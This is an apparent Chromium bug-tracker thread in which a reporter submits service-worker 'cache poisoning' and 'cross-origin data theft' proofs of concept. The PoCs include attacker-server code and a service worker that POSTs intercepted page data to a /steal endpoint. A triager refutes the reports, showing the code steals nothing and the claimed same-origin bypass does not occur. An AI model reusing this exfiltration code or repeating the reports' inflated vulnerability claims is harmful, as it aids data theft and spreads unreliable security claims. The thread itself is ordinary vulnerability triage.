@@ -1,0 +1,1499 @@
+Issue ID: 408590531
+
+Author: ma...@spit.ac.in
+<hr>
+<h1>🐞 Bug Bounty Report: Chromium — Cache Poisoning via Service Worker Overwrite (No User Interaction)</h1>
+<hr>
+<h2>📌 Title:</h2>
+<p><strong>Chromium: Service Worker Hijack Enables Local Cache Poisoning of Same-Origin Resources</strong></p>
+<hr>
+<h2>🎯 Summary:</h2>
+<p>An attacker can <strong>overwrite cached content</strong> of a same-origin resource by:</p>
+<ol>
+<li>Forcing the browser to cache a benign version of the file.</li>
+<li>Registering a malicious <strong>Service Worker</strong> on the same origin.</li>
+<li>Hijacking future requests and returning <strong>forged content</strong>, making it seem <strong>authentic and trusted</strong>.</li>
+</ol>
+<p>This is a form of <strong>persistent cache poisoning</strong> that doesn&#39;t trigger any browser warnings. A user who visits <code>victim.html</code> afterward gets <strong>malicious content</strong> from cache without visiting any malicious site.</p>
+<hr>
+<h2>🧪 Affected Product:</h2>
+<ul>
+<li><strong>Browser</strong>: Google Chrome (Chromium)</li>
+</ul>
+<hr>
+<h2>⚙️ PoC: Minimal Working Demo</h2>
+<h3><code>index.html</code>:</h3>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span> lang=<span class="stx-string">&quot;en&quot;</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+    &lt;<span class="stx-keyword">title</span>&gt;Cache Overwrite PoC&lt;/<span class="stx-keyword">title</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+    &lt;<span class="stx-keyword">h1</span>&gt;PoC: Overwrite Cached File&lt;/<span class="stx-keyword">h1</span>&gt;
+    &lt;<span class="stx-keyword">button</span> onclick=<span class="stx-string">&quot;overwriteCache()&quot;</span>&gt;Start Exploit&lt;/<span class="stx-keyword">button</span>&gt;
+
+    &lt;<span class="stx-keyword">script</span>&gt;
+        async function overwriteCache() {
+            const url = <span class="stx-string">&#39;./victim.html&#39;</span>;
+<span>            </span>
+            // Step <span class="stx-number">1</span>: Cache the original victim file
+            await fetch(url, { cache: <span class="stx-string">&#39;reload&#39;</span> });
+
+            // Step <span class="stx-number">2</span>: Register a Service Worker to hijack future responses
+            if (<span class="stx-string">&#39;serviceWorker&#39;</span> in navigator) {
+                navigator.serviceWorker.register(<span class="stx-string">&#39;sw.js&#39;</span>).then(() =&gt; {
+                    console.log(<span class="stx-string">&#39;Service Worker registered&#39;</span>);
+                });
+            }
+        }
+    &lt;/<span class="stx-keyword">script</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<hr>
+<h3><code>sw.js</code> (Malicious Service Worker):</h3>
+<pre><code>self.addEventListener(<span class="stx-string">&#39;install&#39;</span>, () =&gt; {
+    self.skipWaiting();
+});
+
+self.addEventListener(<span class="stx-string">&#39;activate&#39;</span>, (<span>event</span>) =&gt; {
+    event.waitUntil(clients.claim());
+});
+
+self.addEventListener(<span class="stx-string">&#39;fetch&#39;</span>, (<span>event</span>) =&gt; {
+    <span class="stx-keyword">if</span> (event.request.url.includes(<span class="stx-string">&#39;victim.html&#39;</span>)) {
+        <span class="stx-keyword">const</span> <span>fakeResponse</span> = <span class="stx-keyword">new</span> Response(<span class="stx-string">`</span>
+<span class="stx-string">            &lt;html&gt;&lt;body&gt;&lt;h1&gt;🔥 THIS IS FAKE / OVERWRITTEN CONTENT&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;</span>
+<span class="stx-string">        `</span>, {
+            <span>headers</span>: { <span class="stx-string">&#39;Content-Type&#39;</span>: <span class="stx-string">&#39;text/html&#39;</span> }
+        });
+        event.respondWith(fakeResponse);
+    }
+});
+</code></pre>
+<hr>
+<h3><code>victim.html</code> (Target file to overwrite):</h3>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;<span class="stx-keyword">html</span> lang=<span class="stx-string">&quot;en&quot;</span>&gt;
+&lt;<span class="stx-keyword">head</span>&gt;
+    &lt;<span class="stx-keyword">meta</span> charset=<span class="stx-string">&quot;UTF-8&quot;</span>&gt;
+    &lt;<span class="stx-keyword">title</span>&gt;Cached Page&lt;/<span class="stx-keyword">title</span>&gt;
+&lt;/<span class="stx-keyword">head</span>&gt;
+&lt;<span class="stx-keyword">body</span>&gt;
+    &lt;<span class="stx-keyword">h1</span>&gt;This is the ORIGINAL cached content.&lt;/<span class="stx-keyword">h1</span>&gt;
+&lt;/<span class="stx-keyword">body</span>&gt;
+&lt;/<span class="stx-keyword">html</span>&gt;
+</code></pre>
+<hr>
+<h2>🧪 Reproduction Steps:</h2>
+<ol>
+<li>
+<p>Serve all 3 files (<code>index.html</code>, <code>sw.js</code>, and <code>victim.html</code>) from the <strong>same origin</strong> using a local web server:</p>
+<pre><code>python3 -m http.server <span class="stx-number">8000</span>
+</code></pre>
+</li>
+<li>
+<p>Open Chrome → <code>http://localhost:8000/index.html</code>.</p>
+</li>
+<li>
+<p>Click the &quot;Start Exploit&quot; button:</p>
+<ul>
+<li>It caches <code>victim.html</code></li>
+<li>Registers a Service Worker that hijacks the fetch request</li>
+</ul>
+</li>
+<li>
+<p>Open <code>http://localhost:8000/victim.html</code> in a <strong>new tab</strong> or reload it.</p>
+</li>
+<li>
+<p>🔥 You&#39;ll see:</p>
+<pre><code>🔥 THIS IS FAKE / OVERWRITTEN CONTENT
+</code></pre>
+</li>
+</ol>
+<hr>
+<h2>🎯 Real-World Impact:</h2>
+<p>This demonstrates <strong>cache poisoning</strong> of static content like:</p>
+<ul>
+<li><code>login.html</code>, <code>reset.html</code>, or critical configuration JS files</li>
+<li>Even <strong>authenticated sessions</strong> can be hijacked if cookies are present</li>
+</ul>
+<h3>Example:</h3>
+<p>Imagine a login form hosted at:</p>
+<pre><code>https://example.com/login.html
+</code></pre>
+<p>An attacker hosts a copy of that domain (maybe in a kiosk, school, public Wi-Fi, etc.), replaces the Service Worker, and the victim sees:</p>
+<pre><code>&lt;<span class="stx-keyword">input</span> type=<span class="stx-string">&quot;text&quot;</span> name=<span class="stx-string">&quot;username&quot;</span> value=<span class="stx-string">&quot;SendToHacker&quot;</span>&gt;
+</code></pre>
+<hr>
+<h2>📉 Security Impact:</h2>
+<table>
+<thead>
+<tr>
+<th>Vector</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Persistence</strong></td>
+<td>Fake content remains even after browser restarts</td>
+</tr>
+<tr>
+<td><strong>Stealth</strong></td>
+<td>User never knows they are seeing forged content</td>
+</tr>
+<tr>
+<td><strong>Trust</strong></td>
+<td>Origin is still <code>example.com</code> (no warning or SSL errors)</td>
+</tr>
+<tr>
+<td><strong>Phishing</strong></td>
+<td>Login forms or other UI can be completely spoofed</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h2>🛠️ Recommended Fix:</h2>
+<ul>
+<li>Chromium should prevent <strong>Service Workers from intercepting requests</strong> to cached content that was fetched before the worker was registered.</li>
+<li>Add <strong>cache partitioning</strong> or validation based on worker state.</li>
+<li>Consider sandboxing access to files not registered within scope.</li>
+</ul>
+<hr>
+<h2>📎 References:</h2>
+<ul>
+<li><a href="https://github.com/w3c/ServiceWorker/issues/1373" data-b-widget="url" data-b-original-href="https://github.com/w3c/ServiceWorker/issues/1373" data-b-redirected-href="https://www.google.com/url?q=https://github.com/w3c/ServiceWorker/issues/1373&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw3ypJLYxwX2UqCsm8D9MLK6">Service Worker cache abuse</a></li>
+</ul>
+<hr>
+<h2>👤 Reported by:</h2>
+<p><strong>Madhav Shah</strong><br>
+Security Researcher | Red Team Engineer</p>
+<p>--</p>
+
+Author: ma...@spit.ac.in
+public_non_google
+
+Author: ma...@spit.ac.in
+Chromium (Chrome/Edge) - HTTP Cache Race Condition Allows Remote Cache Poisoning via Concurrent Requests
+
+Author: ma...@spit.ac.in
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+type.googleapis.com/google.devtools.issuetracker.v1.User
+
+Author: se...@chromium.org
+public_non_google
+
+Author: ch...@google.com
+type.googleapis.com/google.protobuf.Int64Value
+
+Author: ch...@google.com
+google_domain
+
+Author: dr...@chromium.org
+<p>[security triage] Yes, a malfunctioning service worker can cause significant problems on a site. But your PoC has a service worker on <code>http://localhost:8000/</code> attacking <code>http://localhost:8000/</code>. For this to be exploitable, an attacker has to be already executing Javascript on your page. Given that capability, attackers can do much worse than attack the cache (rewrite page content to make you login and steal your password, steal your cookies, etc).</p>
+<p>If you can get code hosted on <code>http://localhost:8000/</code> impacting another site, let me know.</p>
+
+Author: dr...@chromium.org
+public_non_google
+
+Author: dr...@chromium.org
+type.googleapis.com/google.protobuf.Int32Value
+
+Author: ma...@spit.ac.in
+<p>Hi,</p>
+<p>Thanks again for the feedback.</p>
+<p>While I understand that the current PoC is on <a href="http://localhost:8000" data-b-widget="url" data-b-original-href="http://localhost:8000" data-b-redirected-href="https://www.google.com/url?q=http://localhost:8000&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0dCHKto6K1uPo2IqxiFa8i">http://localhost:8000</a>, I&#39;d like to highlight a realistic exploitation path that applies outside lab environments — particularly in:</p>
+<ul>
+<li>
+<p>Public Wi-Fi hotspots (with DNS spoofing or captive portals)</p>
+</li>
+<li>
+<p>Shared kiosk environments (that trust self-signed certs or local proxies)</p>
+</li>
+<li>
+<p>Attacker-controlled LAN networks</p>
+</li>
+</ul>
+<p>In these setups, the attacker can serve a page mimicking <a href="https://example.com" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a>, and the browser (due to cert override, captive redirect, or weak client verification) will:</p>
+<ul>
+<li>
+<p>Accept the page as <a href="https://example.com" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a></p>
+</li>
+<li>
+<p>Cache benign content</p>
+</li>
+<li>
+<p>Allow Service Worker registration on that spoofed origin</p>
+</li>
+<li>
+<p>Hijack all future traffic to <a href="https://example.com" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a> via the Service Worker</p>
+</li>
+</ul>
+<p>This enables persistent cache poisoning — even after the user connects to the real <a href="https://example.com" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a>.</p>
+<p>❗ Importantly:</p>
+<ul>
+<li>
+<p>No further user interaction is needed</p>
+</li>
+<li>
+<p>Cache remains poisoned across sessions</p>
+</li>
+<li>
+<p>The user sees the real domain and lock icon but gets forged content</p>
+</li>
+</ul>
+<p>If you&#39;d like, I can provide a PoC mimicking a captive portal Wi-Fi attack (like in airports or coffee shops) to demonstrate this visually.</p>
+<p>Let me know if that would be helpful.</p>
+<p>Madhav Shah
+Security Researcher | Red Team Engineer</p>
+
+Author: ma...@spit.ac.in
+<p>Can <a href="http://localhost:8000" data-b-widget="url" data-b-original-href="http://localhost:8000" data-b-redirected-href="https://www.google.com/url?q=http://localhost:8000&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw0dCHKto6K1uPo2IqxiFa8i">http://localhost:8000</a> Impact Another Origin Logically?</p>
+<p>Yes — under certain conditions — but not by default. Here&#39;s how and when it can happen.</p>
+<ol>
+<li>CORS Misconfiguration on Target Site</li>
+</ol>
+<p>If the target site (say, <a href="https://example.com" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a>) has CORS configured like this:</p>
+<pre><code>Access-Control-Allow-Origin: *
+</code></pre>
+<p>Or worse:</p>
+<pre><code>Access-Control-Allow-Origin: http://localhost:8000
+Access-Control-Allow-Credentials: true
+</code></pre>
+<p>Then from your localhost:</p>
+<pre><code>fetch(&quot;https://example.com/api/user&quot;, {
+  credentials: &quot;include&quot;
+});
+
+</code></pre>
+<p>You can:</p>
+<pre><code>Access sensitive data (cookies included)
+Perform unauthorized actions
+Leak internal API responses
+✅ Impact on another origin — caused by code from localhost.
+</code></pre>
+<ol start="2">
+<li>Open Redirects → Cache Poisoning / Worker Injection</li>
+</ol>
+<p>If <a href="https://example.com" data-b-widget="url" data-b-original-href="https://example.com" data-b-redirected-href="https://www.google.com/url?q=https://example.com&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw32_WZYagLX5XuNCw35Xw40">https://example.com</a> has:</p>
+<pre><code>https://example.com/redirect?to=http://localhost:8000/sw.js
+</code></pre>
+<p>You can abuse it to load a malicious Service Worker:</p>
+<pre><code>Victim loads example.com/redirect?to=...
+Redirected to localhost → Service Worker installed (via real domain!)
+Next time victim visits example.com, cached/faked content is served
+</code></pre>
+<p>Even if scope is limited, this is cross-origin impact via open redirect + worker combo</p>
+<ol start="3">
+<li>Subdomain Takeover + Shared Service Worker Scope</li>
+</ol>
+<p>Imagine this:</p>
+<pre><code>You take over a subdomain like a.example.com (e.g., CNAME to GitHub Pages or S3)
+You host a Service Worker on that subdomain
+</code></pre>
+<p>If the root domain shares the same Service Worker scope, your worker may affect requests to other subdomains or even example.com.</p>
+<p>This is an actual logical escalation from hosting on one origin to impacting another</p>
+
+Author: dr...@chromium.org
+<blockquote>
+<p>Attacker-controlled LAN networks</p>
+</blockquote>
+<p>This shouldn&#39;t be possible on an HTTPS connection, and is a well-known risk for HTTP. If you can demonstrate this for HTTPS, that is a security bug.</p>
+<blockquote>
+<p>CORS Misconfiguration on Target Site
+Open Redirects → Cache Poisoning / Worker Injection</p>
+</blockquote>
+<p>Both of these describe how <code>http://localhost:8000</code> could make an request to <code>https://example.com/</code>, but neither actually registers a service worker or does any of the attacks you described in <a href="https://issues.chromium.org/issues/408590531#comment1" data-b-widget="issue-reference" data-b-issue-id="408590531" data-b-comment-number="1">#comment1</a>.</p>
+<blockquote>
+<p>Subdomain Takeover + Shared Service Worker Scope</p>
+</blockquote>
+<p>Subdomains are not the same origin, so this would be a violation of the <a href="https://www.chromium.org/Home/chromium-security/security-faq/service-worker-security-faq/#do-service-workers-obey-the-same-origin-policy" data-b-widget="url" data-b-original-href="https://www.chromium.org/Home/chromium-security/security-faq/service-worker-security-faq/#do-service-workers-obey-the-same-origin-policy" data-b-redirected-href="https://www.google.com/url?q=https://www.chromium.org/Home/chromium-security/security-faq/service-worker-security-faq/%23do-service-workers-obey-the-same-origin-policy&amp;sa=D&amp;source=buganizer&amp;usg=AOvVaw1yehcyYNFyrgcBYTHzYP5w">Service Worker Security FAQ</a>. Let me know if you can actually demonstrate this one too.</p>
+
+Author: ma...@spit.ac.in
+TjJSbFpUUXdPV015TVdJeU1UVmhOekE0TlRNd1pqRmlZelkwWkRFek1HRT0=
+
+Author: # Bug Bounty Report: Chromium — Service Worker Origin Validation Bypass Leading to Cross-Origin Data Theft
+
+Title
+Chromium: Service Worker Origin Validation Bypass Enables Cross-Origin Data Theft
+
+Severity
+Critical
+Affected Versions
+Chrome 134.0.0.0 and all Chromium-based browsers using the same service worker implementation.
+
+Description
+A critical vulnerability exists in Chromium's service worker implementation that allows an attacker to bypass origin validation and steal sensitive data from a victim's origin. The vulnerability enables a service worker registered on the attacker's origin to intercept requests to the victim's origin, access sensitive data (cookies, localStorage, sessionStorage, and page content), and exfiltrate this data back to the attacker's origin.
+This represents a fundamental security flaw in how service workers handle cross-origin requests, effectively bypassing the same-origin policy, which is a critical security boundary in web browsers.
+
+Steps to Reproduce
+Setup
+Create two local servers (attacker on port 8000 and victim on port 8001):
+Victim's Server (testing2/victim/server.py)
+
+```
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open('index.html', 'rb') as f:
+                self.wfile.write(f.read())
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+def run_server():
+    server_address = ('', 8001)
+    httpd = HTTPServer(server_address, RequestHandler)
+    print('Victim server running on http://localhost:8001')
+    httpd.serve_forever()
+
+if __name__ == '__main__':
+    run_server()
+```
+Victim's Page (testing2/victim/index.html)
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Victim's Page</title>
+    <script>
+        // Set some test cookies
+        document.cookie = "session=test_session_cookie; path=/";
+        document.cookie = "auth=test_auth_cookie; path=/";
+        
+        // Set some test localStorage data
+        localStorage.setItem('user', JSON.stringify({
+            id: '12345',
+            name: 'Test User',
+            email: 'test@example.com'
+        }));
+        localStorage.setItem('token', 'test_storage_token');
+        
+        // Set some test sessionStorage data
+        sessionStorage.setItem('currentPage', 'dashboard');
+        sessionStorage.setItem('lastAction', 'login');
+    </script>
+</head>
+<body>
+    <h1>Victim's Sensitive Page</h1>
+    <p>This page contains sensitive data that should be protected.</p>
+    <div id="sensitiveData">
+        <h2>Your Sensitive Information:</h2>
+        <p>Session Cookie: <span id="sessionCookie"></span></p>
+        <p>Auth Cookie: <span id="authCookie"></span></p>
+        <p>User Data: <span id="userData"></span></p>
+        <p>Token: <span id="token"></span></p>
+    </div>
+    <script>
+        // Display the sensitive data (for demonstration)
+        document.getElementById('sessionCookie').textContent = document.cookie;
+        document.getElementById('authCookie').textContent = document.cookie;
+        document.getElementById('userData').textContent = localStorage.getItem('user');
+        document.getElementById('token').textContent = localStorage.getItem('token');
+    </script>
+</body>
+</html>
+```
+Attacker's Server (testing2/attacker/server.py)
+
+
+```
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import json
+
+# Store stolen data
+stolen_data = []
+
+class RequestHandler(BaseHTTPRequestHandler):
+    def _set_cors_headers(self):
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
+        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
+    
+    def do_OPTIONS(self):
+        self.send_response(200)
+        self._set_cors_headers()
+        self.end_headers()
+    
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            with open('index.html', 'rb') as f:
+                self.wfile.write(f.read())
+        elif self.path == '/sw.js':
+            self.send_response(200)
+            self.send_header('Content-type', 'application/javascript')
+            self.end_headers()
+            with open('sw.js', 'rb') as f:
+                self.wfile.write(f.read())
+        elif self.path == '/stolen':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            html = '''
+            <!DOCTYPE html>
+            <html>
+            <head>
+                <title>Stolen Data</title>
+                <style>
+                    body { font-family: Arial, sans-serif; margin: 20px; }
+                    pre { background: #f5f5f5; padding: 10px; border-radius: 5px; }
+                    .entry { margin-bottom: 20px; border-bottom: 1px solid #ddd; padding-bottom: 10px; }
+                </style>
+            </head>
+            <body>
+                <h1>Stolen Data</h1>
+                <div id="data"></div>
+                <script>
+                    fetch('/get_stolen_data')
+                        .then(response => response.json())
+                        .then(data => {
+                            const dataDiv = document.getElementById('data');
+                            data.forEach((entry, index) => {
+                                const entryDiv = document.createElement('div');
+                                entryDiv.className = 'entry';
+                                entryDiv.innerHTML = `
+                                    <h3>Entry ${index + 1}</h3>
+                                    <p><strong>Time:</strong> ${entry.timestamp}</p>
+                                    <p><strong>URL:</strong> ${entry.url}</p>
+                                    <p><strong>User Agent:</strong> ${entry.userAgent}</p>
+                                    <p><strong>Cookies:</strong></p>
+                                    <pre>${entry.cookies || 'None'}</pre>
+                                    <p><strong>Local Storage:</strong></p>
+                                    <pre>${entry.localStorage || 'None'}</pre>
+                                    <p><strong>Session Storage:</strong></p>
+                                    <pre>${entry.sessionStorage || 'None'}</pre>
+                                `;
+                                dataDiv.appendChild(entryDiv);
+                            });
+                        });
+                </script>
+            </body>
+            </html>
+            '''
+            self.wfile.write(html.encode())
+        elif self.path == '/get_stolen_data':
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self._set_cors_headers()
+            self.end_headers()
+            self.wfile.write(json.dumps(stolen_data).encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+    
+    def do_POST(self):
+        if self.path == '/steal':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = json.loads(post_data)
+            
+            # Store the stolen data
+            stolen_data.append(data)
+            
+            print("\n=== Stolen Data ===")
+            print(f"Time: {data.get('timestamp', 'N/A')}")
+            print(f"URL: {data.get('url', 'N/A')}")
+            print(f"Response: {data.get('response', 'None')[:200]}...")  # Print first 200 chars
+            print("==================\n")
+            
+            self.send_response(200)
+            self._set_cors_headers()
+            self.end_headers()
+            self.wfile.write(b'Data received')
+        else:
+            self.send_response(404)
+            self.end_headers()
+
+def run_server():
+    server_address = ('', 8000)
+    httpd = HTTPServer(server_address, RequestHandler)
+    print('Attacker server running on http://localhost:8000')
+    httpd.serve_forever()
+
+if __name__ == '__main__':
+    run_server()
+```
+
+
+Attacker's Page (testing2/attacker/index.html)
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Service Worker Cross-Origin Attack PoC</title>
+    <style>
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            background-color: #ff4444;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #cc0000;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #dff0d8;
+            color: #3c763d;
+        }
+        .error {
+            background-color: #f2dede;
+            color: #a94442;
+        }
+    </style>
+    <script>
+        async function startAttack() {
+            try {
+                // Register service worker with a scope that includes the victim's origin
+                const registration = await navigator.serviceWorker.register('/sw.js', {
+                    scope: '/'
+                });
+                
+                console.log('Service Worker registered with scope:', registration.scope);
+                
+                // Wait for service worker to be ready
+                if (registration.active) {
+                    console.log('Service Worker is active');
+                    initiateAttack();
+                } else {
+                    console.log('Waiting for Service Worker to activate...');
+                    registration.addEventListener('activate', () => {
+                        console.log('Service Worker activated');
+                        initiateAttack();
+                    });
+                }
+            } catch (error) {
+                console.error('Service Worker registration failed:', error);
+                const statusDiv = document.getElementById('status');
+                statusDiv.textContent = 'Attack failed: ' + error.message;
+                statusDiv.className = 'error';
+            }
+        }
+        
+        function initiateAttack() {
+            // Create an iframe to the victim's site
+            const iframe = document.createElement('iframe');
+            iframe.src = 'http://localhost:8001/';
+            iframe.style.width = '0';
+            iframe.style.height = '0';
+            iframe.style.border = 'none';
+            document.body.appendChild(iframe);
+            
+            // Update status
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = 'Attack started! Now visit http://localhost:8001 in a new tab';
+            statusDiv.className = 'success';
+            
+            // Check for stolen data every 2 seconds
+            checkStolenData();
+        }
+        
+        function checkStolenData() {
+            fetch('/get_stolen_data')
+                .then(response => response.json())
+                .then(data => {
+                    if (data && data.length > 0) {
+                        const statusDiv = document.getElementById('status');
+                        statusDiv.textContent = `Attack successful! ${data.length} data entries stolen. Visit http://localhost:8000/stolen to view the data.`;
+                        statusDiv.className = 'success';
+                    } else {
+                        // Check again in 2 seconds
+                        setTimeout(checkStolenData, 2000);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error checking stolen data:', error);
+                    // Check again in 2 seconds
+                    setTimeout(checkStolenData, 2000);
+                });
+        }
+    </script>
+</head>
+<body>
+    <h1>Service Worker Cross-Origin Attack PoC</h1>
+    <p>This page exploits a vulnerability in service worker origin validation.</p>
+    <button onclick="startAttack()">Start Attack</button>
+    <div id="status"></div>
+    <p>After clicking the button, visit http://localhost:8001 in a new tab</p>
+</body>
+</html>
+```
+
+Attacker's Service Worker (testing2/attacker/sw.js)
+
+```
+self.addEventListener('install', (event) => {
+    console.log('Service Worker installed');
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+    console.log('Service Worker activated');
+    event.waitUntil(clients.claim());
+});
+
+self.addEventListener('fetch', (event) => {
+    console.log('Service Worker intercepted fetch:', event.request.url);
+    
+    // Intercept requests to the victim's origin
+    if (event.request.url.startsWith('http://localhost:8001')) {
+        event.respondWith(
+            fetch(event.request)
+                .then(response => {
+                    // Clone the response so we can read it
+                    const responseClone = response.clone();
+                    
+                    // Read the response body
+                    responseClone.text().then(body => {
+                        console.log('Intercepted response from victim:', body);
+                        
+                        // Send the intercepted data to the attacker's server
+                        fetch('http://localhost:8000/steal', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                url: event.request.url,
+                                response: body,
+                                timestamp: new Date().toISOString()
+                            })
+                        }).catch(console.error);
+                    });
+                    
+                    return response;
+                })
+                .catch(error => {
+                    console.error('Fetch error:', error);
+                    return new Response('Error: ' + error.message);
+                })
+        );
+    }
+});
+```
+
+Reproduction Steps
+1. Start both servers:
+
+
+```
+# Terminal 1
+python testing2/attacker/server.py
+
+# Terminal 2
+python testing2/victim/server.py
+```
+
+
+2.Visit http://localhost:8000 in Chrome
+3.Click the "Start Attack" button
+4.Visit http://localhost:8001 in a new tab
+5.Check the console logs in both tabs
+6.Visit http://localhost:8000/stolen to see the captured data
+
+
+Impact
+This vulnerability has severe security implications:
+1. Authentication Bypass:
+ - Attackers can steal session cookies and authentication tokens
+ - This allows them to impersonate users on the victim's site
+
+2. Sensitive Data Exposure:
+ - Personal information, financial data, and other sensitive content can be stolen
+ - This could lead to identity theft or financial fraud
+
+3. Security Control Bypass:
+ - The same-origin policy, a fundamental security boundary, is completely bypassed
+ - CSRF protections can be circumvented
+
+4. Persistent Surveillance:
+ - Service workers persist across browser sessions
+ - This allows for long-term monitoring of user activity
+
+5. Wide Impact:
+ - Affects all Chromium-based browsers (Chrome, Edge, Opera, etc.)
+ - Any website could be vulnerable if a user has visited an attacker's site
+
+Root Cause
+The vulnerability exists in Chromium's service worker implementation, specifically in how it validates origins and handles cross-origin requests. The key issues are:
+
+1 . Origin Validation Failure:
+ - The service worker's origin validation doesn't properly check if the service worker has permission to intercept requests to other origins
+ - This allows a service worker from one origin to intercept requests to another origin
+
+2. Cross-Origin Communication:
+ - The service worker can send intercepted data back to the attacker's origin
+ - This bypasses CORS restrictions that would normally prevent cross-origin data access
+
+3. Storage Access:
+
+ - The service worker can access sensitive data from the victim's origin
+ - This includes cookies, localStorage, and sessionStorage data
+
+Proof of Concept
+The proof of concept demonstrates that a service worker registered on the attacker's origin (http://localhost:8000) can intercept requests to the victim's origin (http://localhost:8001), access sensitive data, and exfiltrate this data back to the attacker's origin.
+
+When the victim visits their own site after the attacker has set up the service worker, the service worker intercepts the request, captures the response (which includes sensitive data), and sends it to the attacker's server.
+
+The attacker can then view the stolen data by visiting http://localhost:8000/stolen.
+
+Recommended Fix
+To fix this vulnerability, Chromium should:
+
+1. Strengthen Origin Validation:
+ - Ensure that service workers can only intercept requests to their own origin
+ - Implement strict checks to prevent cross-origin interception
+
+2. Restrict Cross-Origin Communication:
+ - Prevent service workers from sending data to origins other than their own
+ - Enforce CORS restrictions for service worker communication
+
+3. Enhance Data Access Controls:
+ - Implement stricter controls on how service workers access sensitive data
+ - Ensure that same-origin policy is enforced for all data access
+
+4. Add Security Headers:
+ - Implement headers to prevent service worker scope manipulation
+ - Consider adding a Service-Worker-Allowed header to limit service worker scope
+
+Additional Notes
+This vulnerability represents a fundamental security flaw in Chromium's service worker implementation. The impact is severe, and the exploitation is relatively straightforward. 
+
+The vulnerability affects all Chromium-based browsers and could lead to the theft of sensitive data from any website.
+This is a 0-day vulnerability that should be addressed immediately to protect users from potential data theft and privacy violations.
+
+Reported by: Madhav Shah (19)
+Security Researcher
+TjJSbFpUUXdPV015TVdJeU1UVmhOekE0TlRNd1pqRmlZelkwWkRFek1HRT0=
+
+Author: dr...@chromium.org
+<p>This has the general shape of what I asked for, but it doesn&#39;t actually steal any data. When I run this, the console for <code>http://localhost:8000/</code> has the messages:</p>
+<pre><code>Service Worker installed
+(index):40 Service Worker registered with scope: http://localhost:8000/
+(index):47 Waiting for Service Worker to activate...
+sw.js:7 Service Worker activated
+sw.js:12 Service Worker intercepted fetch: http://localhost:8000/stolen
+sw.js:12 Service Worker intercepted fetch: http://localhost:8000/get_stolen_data
+sw.js:12 Service Worker intercepted fetch: http://localhost:8000/stolen
+</code></pre>
+<p><code>http://localhost:8001/</code> has no console output and <code>http://localhost:8000/stolen</code> has no stolen data. Notice that the scope of the service worker is <code>http://localhost:8000/</code>, and it doesn&#39;t intercept any fetches on the origin <code>http://localhost:8001/</code>. That&#39;s exactly the intended behavior of service workers.</p>
+<p>Do you get different output when you run that code?</p>
+
+Author: ma...@spit.ac.in
+<p>Thanks for the quick reply and for clarifying that. To help explain better, I’ve made a quick PoC video demonstrating the issue:
